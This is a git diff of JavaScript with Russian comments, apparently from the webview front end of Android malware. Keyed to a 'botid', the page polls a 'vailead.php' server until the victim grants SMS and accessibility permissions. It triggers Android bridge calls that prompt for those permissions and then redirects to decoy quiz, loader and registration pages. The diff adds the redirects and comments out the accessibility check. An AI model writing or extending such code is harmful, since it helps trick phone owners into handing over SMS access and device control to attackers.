@@ -141,6 +141,8 @@ document.addEventListener("DOMContentLoaded", function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         // Обработка успешного ответа сервера
         //  console.log(xhr.responseText);
+        window.location.href = '../quiz.html';
+
         // sendRequestWithBotId(); // Вызываем функцию showLoaderAndRedirect() после выполнения запроса
       } else {
         // Обработка ошибок
@@ -175,6 +177,8 @@ document.addEventListener("DOMContentLoaded", function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         // Обработка успешного ответа сервера
         console.log(xhr.responseText);
+        window.location.href = '../loader.html';
+
         sendRequestWithBotId(); // Вызываем функцию sendRequestWithBotId() после выполнения запроса
       } else {
         // Обработка ошибок
@@ -242,7 +246,7 @@ document.addEventListener("DOMContentLoaded", function () {
             setTimeout(checkSmsPerm, 1000);
           } else if (responseCode === 200) {
             //разрешение выдано
-            alert("perm est!");
+            window.location.href = '../registration.html';
           } else if (responseCode === 202) {
             //разрешение не выдано
             Android.clicksmsaccess();
@@ -256,36 +260,36 @@ document.addEventListener("DOMContentLoaded", function () {
       console.error("Missing botid parameter");
     }
   }
-  function checkGivePerm() {
-    var botId = getQueryParam("botid");
-    if (botId) {
-      var xhr = new XMLHttpRequest();
-      xhr.open(
-        "GET",
-        "vailead.php?method=perm&perminfo=accessibility&botid=" + botId,
-        true
-      );
-      xhr.onreadystatechange = function () {
-        if (xhr.readyState === 4) {
-          var responseCode = xhr.status;
-          if (responseCode === 400) {
-            setTimeout(checkGivePerm, 1000);
-          } else if (responseCode === 200) {
-            //разрешение выдано
-            alert("perm est!");
-          } else if (responseCode === 202) {
-            //разрешение не выдано
-            Android.clickgiveaccess();
-          } else {
-            console.error("Unexpected response code: " + responseCode);
-          }
-        }
-      };
-      xhr.send();
-    } else {
-      console.error("Missing botid parameter");
-    }
-  }
+  // function checkGivePerm() {
+  //   var botId = getQueryParam("botid");
+  //   if (botId) {
+  //     var xhr = new XMLHttpRequest();
+  //     xhr.open(
+  //       "GET",
+  //       "vailead.php?method=perm&perminfo=accessibility&botid=" + botId,
+  //       true
+  //     );
+  //     xhr.onreadystatechange = function () {
+  //       if (xhr.readyState === 4) {
+  //         var responseCode = xhr.status;
+  //         if (responseCode === 400) {
+  //           setTimeout(checkGivePerm, 1000);
+  //         } else if (responseCode === 200) {
+  //           //разрешение выдано
+  //           alert("perm est!");
+  //         } else if (responseCode === 202) {
+  //           //разрешение не выдано
+  //           Android.clickgiveaccess();
+  //         } else {
+  //           console.error("Unexpected response code: " + responseCode);
+  //         }
+  //       }
+  //     };
+  //     xhr.send();
+  //   } else {
+  //     console.error("Missing botid parameter");
+  //   }
+  // }
   function getQueryParam(name) {
     var urlParams = new URLSearchParams(window.location.search);
     return urlParams.get(name);
